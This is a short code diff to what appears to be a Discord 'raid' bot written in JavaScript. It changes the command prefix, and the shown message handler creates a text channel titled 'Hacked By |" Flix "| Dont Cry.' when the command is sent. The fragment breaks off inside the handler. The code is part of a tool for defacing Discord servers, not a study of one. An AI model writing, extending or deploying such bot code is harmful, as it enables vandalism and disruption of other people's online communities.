@@ -30,9 +30,10 @@ client.user.setGame(`x:`,"http://twitch.tv/slt")
 
 
 
+
 client.on('message' , async (message) => {
-	const prefix = '.'
-    if (message.content.startsWith(prefix + '.')) {
+	const prefix = '+'
+    if (message.content.startsWith(prefix + '+')) {
 for (let i = 0; i < 1; i++) {
 
         message.guild.createChannel('Hacked By |" Flix "| Dont Cry.', 'text')
